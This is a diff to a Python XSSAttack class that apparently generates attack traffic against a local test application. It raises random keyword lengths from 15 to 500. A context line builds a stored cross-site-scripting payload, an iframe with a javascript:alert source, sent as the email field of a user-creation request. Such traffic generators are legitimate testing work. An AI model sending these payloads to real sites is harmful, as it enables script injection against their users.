@@ -419,7 +419,7 @@ class XSSAttack(Attack):
         attack = ""
         random_sleep(1, 3)
         attackCategory = random.randint(0, 8)
-        attackKeyWordLength = random.randint(1, 15)
+        attackKeyWordLength = random.randint(1, 500)
 
         if attackCategory == 0:
             attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
@@ -485,7 +485,7 @@ class XSSAttack(Attack):
         attack = ""
         random_sleep(1, 3)
         attackCategory = random.randint(0, 8)
-        attackKeyWordLength = random.randint(1, 15)
+        attackKeyWordLength = random.randint(1, 500)
 
         if attackCategory == 0:
             attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
@@ -537,7 +537,7 @@ class XSSAttack(Attack):
 
         url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/api/Users"
         headers = {"Content-Type": "application/json"}
-        attackKeyWordLength = random.randint(1, 15)
+        attackKeyWordLength = random.randint(1, 500)
         attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         payload = {"email": "<iframe src=\"javascript:alert(`" + attackKeyWord + "`)\">", "password": "xss"}
 
@@ -556,7 +556,7 @@ class XSSAttack(Attack):
         attack = ""
         random_sleep(1, 3)
         attackCategory = random.randint(0, 8)
-        attackKeyWordLength = random.randint(1, 15)
+        attackKeyWordLength = random.randint(1, 500)
 
         if attackCategory == 0:
             attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
